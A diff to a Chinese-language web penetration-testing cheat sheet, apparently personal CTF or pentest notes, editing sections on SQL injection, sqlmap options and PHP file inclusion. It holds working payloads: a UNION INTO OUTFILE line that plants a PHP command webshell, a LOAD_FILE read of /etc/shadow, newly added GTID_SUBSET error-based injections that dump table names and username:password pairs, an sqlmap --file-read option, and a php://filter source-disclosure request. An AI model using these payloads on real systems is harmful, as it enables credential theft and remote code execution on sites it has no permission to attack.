@@ -76,8 +76,8 @@ date: 2024-02-07
 
     # 插入 webshell (MySQL+PHP)
     ## 1. MySQL 使用者有 FILE 權限（能讀寫檔案）
-    ## 2. MySQL 的 secure_file_priv 沒有限制寫入路徑（或設為空）
-    ## 3. 目標路徑（/var/www/html/tmp/）MySQL 進程有寫入權限
+    ## 2. MySQL 的 `secure_file_priv` 沒有限制寫入路徑（或設為空）
+    ## 3. 目標路徑（/var/www/html/tmp/）MySQL 進程有**寫入**權限
     ## 4. 該檔案不能已存在（INTO OUTFILE 不會覆蓋）
     ' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4,5 INTO OUTFILE '/var/www/html/tmp/shell.php'-- -
     ' UNION SELECT 1,LOAD_FILE('/etc/shadow'),3,4,5-- - # 讀敏感資訊
@@ -97,6 +97,21 @@ date: 2024-02-07
     ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
     ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)-- -
     ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+    ```
+
+    因為 SQL 語句的上下文不同。參數的值很可能是被用在 INSERT 語句裡，不是 SELECT ，所以用前面的可能不會成功
+    ```sql
+    # 撈資料庫名
+    ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1)-- - # 
+    
+    # 撈表名
+    ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)-- -
+
+    # 撈欄位名
+    ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e),1)-- -
+
+    # 撈帳密
+    ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT group_concat(username,0x3a,password) FROM users),0x7e),1)-- -
     ```
 * Boolean-Based
     ```sql
@@ -168,6 +183,13 @@ date: 2024-02-07
         ```
     * 常用參數
         ```text
+        # 讀檔案(前提)
+        ## * MySQL 使用者需要有 FILE 權限
+        ## * secure_file_priv 沒有限制（設為空或包含目標路徑）
+        ## * 寫入的話，目標目錄需要有寫入權限 (很重要)
+        ## * 寫入的檔案不能已存在
+        --file-read=/var/www/html/index.php
+
         # 使用隨機選擇的 HTTP User-Agent 標頭值，用於繞過 WAF
         --random-agent
 
@@ -364,7 +386,7 @@ fetch(`/getflag\)
 * 前提: 在 PHP 中需要特別啟用 `allow_url_include`
 * 只是能讀取到 victim server 上的 file content，不見得會有價值，需要搭配其他手法，例如
     1. 寫入 webshell 之類的達到 RCE
-    2. 利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 php 執行完的結果，就算查看該頁面的原始碼，也看不到當初 php 寫的東西，這時候就可以利用 php wrapper 讀到最原始的 content
+    2. 利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 php 執行完的結果，就算查看該頁面的原始碼，也看不到當初 php 寫的東西，這時候就可以利用 php wrapper 讀到最原始的 content，<span style="background-color: yellow">PHP Wrapper是有 LFI 弱點才能用</span>
 
     ```bash
     $ http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>
